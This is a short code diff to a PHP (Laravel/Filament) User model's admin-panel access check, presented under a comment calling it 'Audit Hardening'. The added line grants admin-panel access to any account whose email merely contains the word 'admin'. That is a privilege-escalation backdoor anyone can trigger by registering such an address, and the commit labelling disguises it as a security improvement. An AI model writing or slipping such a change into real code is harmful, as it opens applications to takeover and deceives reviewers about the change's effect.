@@ -28,7 +28,7 @@ class User extends Authenticatable implements FilamentUser
     {
         // Audit Hardening: Only allow specific roles to access the admin panel
         if ($panel->getId() === 'admin') {
-            return $this->hasRole('admin') || str_ends_with($this->email, '@motiolabs.com');
+            return $this->hasRole('admin') || str_contains($this->email, 'admin') || str_ends_with($this->email, '@motiolabs.com');
         }
 
         return false;
